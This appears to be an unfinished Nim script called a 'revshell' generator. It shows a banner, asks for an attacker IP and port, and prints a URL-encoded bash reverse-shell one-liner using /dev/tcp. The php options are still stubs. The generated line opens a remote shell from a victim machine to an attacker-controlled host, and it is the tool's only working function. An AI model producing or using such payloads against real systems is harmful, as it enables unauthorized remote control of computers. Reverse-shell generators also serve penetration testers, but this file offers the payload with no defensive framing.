# 25/02/18

echo """
██████╗░███████╗██╗░░░██╗  ░█████╗░██████╗░██████╗░██╗████████╗
██╔══██╗██╔════╝██║░░░██║  ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝
██████╔╝█████╗░░╚██╗░██╔╝  ██║░░██║██████╔╝██████╦╝██║░░░██║░░░
██╔══██╗██╔══╝░░░╚████╔╝░  ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░
██║░░██║███████╗░░╚██╔╝░░  ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░

Welcome to revshell to shell 
v0.1 = beta version
"""

echo "choose -- bash/interactive.php/php"


var 
    opt_on: string = readLine(stdin) # principal option
    # tipe: string | listar  
    ip_addr, port: string


while true: 
    case opt_on
        of "bash":
            echo "url encode? -- Yes/No"
            let urle: string = readLine(stdin)
            if urle == "Yes":
                (echo "hosted ip:"; ip_addr = readLine(stdin)); (echo "hosted port:"; port = readLine(stdin))
                echo "copy rev generated: bash -c 'bash -i >%26 /dev/tcp/"&ip_addr&"/"&port&" 0>%261' "
                break
            elif urle == "No":
                echo "hosted ip:"
                ip_addr = readLine(stdin)
                echo "hosted port"
                port = readLine(stdin)
                 
        of "php":
            echo "Working..."
            # echo intera
        of "interactive.php":
            echo "Working..."
        else:
            echo "Not working..."
            break

